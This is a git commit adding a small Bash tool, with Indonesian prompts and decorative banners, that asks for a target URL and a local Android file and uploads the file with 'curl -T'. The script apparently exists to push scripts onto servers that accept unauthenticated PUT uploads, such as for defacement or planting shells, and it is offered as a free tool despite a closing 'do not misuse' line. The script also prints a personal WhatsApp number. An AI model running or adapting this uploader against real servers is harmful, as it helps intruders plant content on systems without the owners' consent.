14ba84b3f62ea74137a97a059be481d3cb0d59d9
WhoMHw <71681090+WhoMHw@users.noreply.github.com>
2020-10-17 11:34:23 +0700

    Add files via upload

---
+++ MHw.sh
@@ -0,0 +1,57 @@
+#!/bin/bash
+
+
+echo "////////////////////////////////////////////////////////////////////////////////////////"
+sleep 0.01
+echo "                                  Author:WhoMHw                                           "
+sleep 0.01
+echo "                                                                               //"
+sleep 0.01
+echo "                                                                               \\"
+sleep 0.02
+echo "//////////////////////////////////////////////////////////////////////////////////////"
+
+   echo "selamat datang kaka,siapa nama kaka?" #tulisan keluar
+ read nick #membaca tulisan masuk
+ clear
+ echo "##########"
+  echo "##########         ini toool milik bersama                                                       ######"
+sleep 0.03
+   echo  "#########               WhoMHw and MR.WR.py                                                    ######"
+    echo "#########                                                                                      ######"
+     echo "##########                                                                                    ######"
+      echo "##########                                                                                   ######"
+       echo "###############№##################################################################################"
+        echo  "############################№#############################################################"
+         echo "######################################№№#################################################"
+
+
+                echo "selamat datang di tools ini" $nick
+
+
+
+echo "tunggg bentarrr................."
+
+
+echo "Wa : 085336515046"
+
+
+
+
+ echo "masukkan target kamu : "
+ read target
+ sleep 0.01
+ echo "input file kamu :"
+ read file
+ sleep 0.03
+ echo "tunggu bentar ya tod w lagi apluod scrpit lu...."
+ sleep 0.01
+ curl -T /storage/emulated/0/$file $target
+ 
+ echo
+echo "==================================="
+echo " Tools ini gratis"
+echo " Who MHw and MR.WR.py"
+echo " Dilarang menjual belikan tools ini"
+echo " Dilarang menyalahgunakan tools ini :)"
+echo "==================================="
